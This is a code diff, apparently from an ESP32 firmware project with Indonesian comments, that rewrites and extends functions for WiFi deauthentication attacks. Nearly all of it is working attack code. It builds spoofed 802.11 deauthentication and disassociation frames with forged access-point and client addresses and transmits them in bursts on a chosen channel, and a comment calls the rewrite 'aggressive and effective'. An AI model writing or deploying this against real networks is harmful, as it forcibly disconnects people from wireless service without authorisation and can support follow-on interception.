@@ -78,56 +78,122 @@ bool WiFi_Utils::changeMACAddress() {
   }
 }
 
-// Fungsi UTAMA: Mengirimkan paket Deauthentication
+
+// Fungsi UTAMA: Versi Hibrida - Terstruktur, Agresif, dan Efektif
 void WiFi_Utils::sendDeauthPacket(const uint8_t* bssid, const uint8_t* client_mac) {
-  // Struktur paket deauth
-  // https://mrncciew.com/2014/10/08/802-11-mgmt-deauthentication-frame/
-  uint8_t packet[26] = {
-    /*  0 - 1  */ 0xC0, 0x00,                         // Frame Control
-    /*  2 - 3  */ 0x00, 0x00,                         // Duration
-    /*  4 - 9  */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination Address (client_mac)
-    /* 10 - 15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (bssid)
-    /* 16 - 21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (bssid)
-    /* 22 - 23 */ 0x00, 0x00,                         // Sequence Number
-    /* 24 - 25 */ 0x07, 0x00                          // Reason Code: 7 = Class 3 frame received from nonassociated STA
-  };
+  // Gunakan struct yang mudah dibaca dan aman
+  struct {
+    uint8_t frame_control[2];
+    uint8_t duration[2];
+    uint8_t addr1[6]; // Destination Address
+    uint8_t addr2[6]; // Source Address
+    uint8_t addr3[6]; // BSSID
+    uint8_t sequence_control[2];
+    uint8_t reason_code[2];
+  } __attribute__((packed)) packet;
+
+  // Isi field yang tidak berubah
+  packet.duration[0] = 0x00;
+  packet.duration[1] = 0x00;
+  packet.reason_code[0] = 0x07; // Reason Code 7
+  packet.reason_code[1] = 0x00;
+
   // --- Paket 1: Deauth dari AP ke Klien ---
-  packet[0] = 0xC0; // Type: Management, Subtype: Deauthentication
-  // Salin MAC address ke dalam paket
-  memcpy(&packet[4], client_mac, 6);  // Tujuan adalah klien
-  memcpy(&packet[10], bssid, 6);      // Sumber adalah AP
-  memcpy(&packet[16], bssid, 6);      // BSSID adalah AP
-  packet[22] = random(256); // Random sequence number
-  // Kirim paket menggunakan fungsi level rendah ESP-IDF
-  // esp_wifi_80211_tx(interface, buffer, panjang, tidak di-enqueue)
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-  
-  delay(1); // Beri jeda singkat agar tidak membebani buffer
+  packet.frame_control[0] = 0xC0; // Deauth Frame
+  packet.frame_control[1] = 0x00;
+  memcpy(packet.addr1, client_mac, 6); // Destination = Client
+  memcpy(packet.addr2, bssid, 6);     // Source = AP
+  memcpy(packet.addr3, bssid, 6);     // BSSID = AP
+  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), true);
+  delay(1);
 
   // --- Paket 2: Deauth dari Klien ke AP ---
-  memcpy(&packet[4], bssid, 6);      // Destination = AP
-  memcpy(&packet[10], client_mac, 6); // Source = Client
-  memcpy(&packet[16], bssid, 6);     // BSSID = AP
-  packet[22] = random(256); // Random sequence number
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+  memcpy(packet.addr1, bssid, 6);     // Destination = AP
+  memcpy(packet.addr2, client_mac, 6); // Source = Client
+  // addr3 (BSSID) tetap bssid
+  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), true);
   delay(1);
 
   // --- Paket 3: Disassociation dari AP ke Klien ---
-  packet[0] = 0xA0; // Type: Management, Subtype: Disassociation
-  memcpy(&packet[4], client_mac, 6);  // Destination = Client
-  memcpy(&packet[10], bssid, 6);     // Source = AP
-  memcpy(&packet[16], bssid, 6);     // BSSID = AP
-  packet[22] = random(256); // Random sequence number
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+  packet.frame_control[0] = 0xA0; // Disassociation Frame
+  packet.frame_control[1] = 0x00;
+  memcpy(packet.addr1, client_mac, 6); // Destination = Client
+  memcpy(packet.addr2, bssid, 6);     // Source = AP
+  // addr3 (BSSID) tetap bssid
+  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), true);
   delay(1);
 
   // --- Paket 4: Disassociation dari Klien ke AP ---
-  memcpy(&packet[4], bssid, 6);      // Destination = AP
-  memcpy(&packet[10], client_mac, 6); // Source = Client
-  memcpy(&packet[16], bssid, 6);     // BSSID = AP
-  packet[22] = random(256); // Random sequence number
-  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
+  memcpy(packet.addr1, bssid, 6);     // Destination = AP
+  memcpy(packet.addr2, client_mac, 6); // Source = Client
+  // addr3 (BSSID) tetap bssid
+  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&packet, sizeof(packet), true);
 }
+
+void WiFi_Utils::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
+  WiFi_Utils::set_channel = channel;
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  delay(1);
+  
+  // Build AP source packet
+  deauth_frame_default[4] = mac[0];
+  deauth_frame_default[5] = mac[1];
+  deauth_frame_default[6] = mac[2];
+  deauth_frame_default[7] = mac[3];
+  deauth_frame_default[8] = mac[4];
+  deauth_frame_default[9] = mac[5];
+  
+  deauth_frame_default[10] = bssid[0];
+  deauth_frame_default[11] = bssid[1];
+  deauth_frame_default[12] = bssid[2];
+  deauth_frame_default[13] = bssid[3];
+  deauth_frame_default[14] = bssid[4];
+  deauth_frame_default[15] = bssid[5];
+
+  deauth_frame_default[16] = bssid[0];
+  deauth_frame_default[17] = bssid[1];
+  deauth_frame_default[18] = bssid[2];
+  deauth_frame_default[19] = bssid[3];
+  deauth_frame_default[20] = bssid[4];
+  deauth_frame_default[21] = bssid[5];      
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+  packets_sent = packets_sent + 3;
+
+  // Build AP dest packet
+  deauth_frame_default[4] = bssid[0];
+  deauth_frame_default[5] = bssid[1];
+  deauth_frame_default[6] = bssid[2];
+  deauth_frame_default[7] = bssid[3];
+  deauth_frame_default[8] = bssid[4];
+  deauth_frame_default[9] = bssid[5];
+  
+  deauth_frame_default[10] = mac[0];
+  deauth_frame_default[11] = mac[1];
+  deauth_frame_default[12] = mac[2];
+  deauth_frame_default[13] = mac[3];
+  deauth_frame_default[14] = mac[4];
+  deauth_frame_default[15] = mac[5];
+
+  deauth_frame_default[16] = mac[0];
+  deauth_frame_default[17] = mac[1];
+  deauth_frame_default[18] = mac[2];
+  deauth_frame_default[19] = mac[3];
+  deauth_frame_default[20] = mac[4];
+  deauth_frame_default[21] = mac[5];      
+
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+
+  packets_sent = packets_sent + 3;
+}
+
 
 // Dapatkan MAC address saat ini
 std::string WiFi_Utils::macAddress() {
